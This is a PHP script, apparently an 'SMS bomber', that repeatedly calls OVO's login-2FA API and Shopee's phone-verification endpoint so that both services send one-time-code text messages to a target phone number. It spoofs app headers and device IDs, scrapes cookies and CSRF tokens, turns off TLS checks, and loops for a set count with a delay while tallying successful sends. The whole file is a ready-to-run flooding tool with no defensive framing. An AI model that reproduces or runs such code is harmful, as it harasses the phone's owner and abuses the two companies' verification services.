<?php
function Sms_OVO() {
	require ("nomor");
	for ($j = 0; $j < $jumlah; $j++) {
		$deviceId = "752fad89-60f5-3b3f-a6ee-a50d2804".rand (0000, 9999);
		$ci = curl_init();
		curl_setopt ($ci, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt ($ci, CURLOPT_HTTPHEADER, array ("app-id: C7UMRSMFRZ46D9GW9IK7", "App-Version: 2.9.1", "Connection: Keep-Alive", "Content-Type: application/json", "cs-session-id: ", "OS: Android", "User-Agent: okhttp/3.11.0"));
		curl_setopt ($ci, CURLOPT_POST, 1);
		curl_setopt ($ci, CURLOPT_POSTFIELDS, '{"deviceId":"'.$deviceId.'","mobile":"'.$nomor.'"}');
		curl_setopt ($ci, CURLOPT_RETURNTRANSFER, true);
		curl_setopt ($ci, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt ($ci, CURLOPT_URL, "https://api.ovo.id/v2.0/api/auth/customer/login2FA");
		$ce = curl_exec ($ci);
		curl_close ($ci);
		if (preg_match ("/refId/", $ce)) {
			$berhasil += 1;}
		else {
			$gagal += 1;}
		echo $k."\rSms$uo OVO$n • $h$berhasil$u : $m$gagal   ";
		sleep ($jeda);}
	echo "\n";}


function Sms_Shopee() {
	require ("nomor");
	$ci = curl_init();
	curl_setopt ($ci, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt ($ci, CURLOPT_HEADER, 1);
	curl_setopt ($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ci, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt ($ci, CURLOPT_URL, "https://shopee.co.id/buyer/login/signup/?__classic__=1");
	curl_setopt ($ci, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0");
	$content = curl_exec ($ci);
	$cookies = array();
	preg_match_all ("/Set-Cookie:(?<cookie>\s{0,}.*)$/im", $content, $cookies);
	$cookie = "";
	$data = $cookies["cookie"];
	foreach ($data as $cok) {
		$cok = explode ("; ", $cok)[0];
		$cookie .= $cok."; ";}
	preg_match_all ("/name=\'csrfmiddlewaretoken\' value=\'(.*)\'/", $content, $out);
	$csrf = $out[1][0];
	$nomor = "62".substr(trim($nomor), 1);
	for ($j = 0; $j < $jumlah; $j++) {
		$ci = curl_init();
		curl_setopt ($ci, CURLOPT_HTTPHEADER, array ("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-encoding: gzip, deflate, br", "Content-Type: application/x-www-form-urlencoded", "Cookie: cto_lwid=017b9e91-e0b7-442c-bfb7-d25dffc08eaf; _ga=GA1.3.720468445.1518705958; ".$cookie."__BWfp=c1518706006561xdaa1f9740; _gid=GA1.3.1054069102.1524846892; bannerShown=true; SPC_SC_TK=; UYOMAPJWEMDGJ=; SPC_SC_UD=; __utma=156485241.720468445.1518705958.1524846933.1524846933.1; __utmc=156485241; __utmz=156485241.1524846933.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); appier_utmz=%7B%22csr%22%3A%22(direct)%22%2C%22timestamp%22%3A1524846934%7D; _atrk_sync_cookie=true; _atrk_siteuid=YYXX-KkDeR9JL2OU; _gat=1; _gat_gtm=1", "Host: shopee.co.id", "Referer: https://shopee.co.id/buyer/login/signup/", "Upgrade-Insecure-Requests: 1", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"));
		curl_setopt ($ci, CURLOPT_POST, 1);
		curl_setopt ($ci, CURLOPT_POSTFIELDS, "csrfmiddlewaretoken=$csrf&phone_canon=$nomor&password_hash=&otp_seed=phone_signup");
		curl_setopt ($ci, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ci, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt ($ci, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ci, CURLOPT_URL, "https://shopee.co.id/buyer/login/phone_send_vcode/");
		$ce = curl_exec ($ci);
		curl_close ($ci);
		if (preg_match ("/40/", $ce)) {
			$berhasil+= 1;}
		else {
			$gagal+= 1;}
		echo $k."\rSms$us Shopee$n • $h$berhasil$u : $m$gagal   ";
		sleep ($jeda);}
	echo "\n";}


function irul() {
	Sms_OVO();
	Sms_Shopee();}


irul();
?>